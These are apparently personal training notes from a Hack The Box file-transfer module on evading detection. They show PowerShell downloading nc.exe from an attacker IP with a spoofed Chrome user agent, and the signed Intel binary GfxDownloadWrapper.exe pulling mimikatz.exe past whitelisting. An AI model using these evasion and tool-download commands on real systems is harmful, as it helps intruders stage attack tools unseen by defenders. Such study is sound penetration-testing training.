# Changing User Agent
- many file transfers’ user agents have been blacklisted by Administrators
    
    - changing this user agent can help avoid detection
    
## Listing User Agents
```Markdown
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6
Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
- Invoke-WebRequest to download nc.exe will use the Chrome user agent
## Reqeuest Chrome User Agent
```Markdown
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/<file> -UserAgent $UserAgent -OutFile "C:\<outfile>"
```
### New User Agent
```Markdown
Nathan2112@htb[/htb]$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```
  
  
# LOLBAS / GTFOBins
- using a misplaced trust binary may avoid detection completely
- the example they used was the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe)
```Markdown
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
- such a binary might be permitted to run by application whitelisting and be excluded from alerting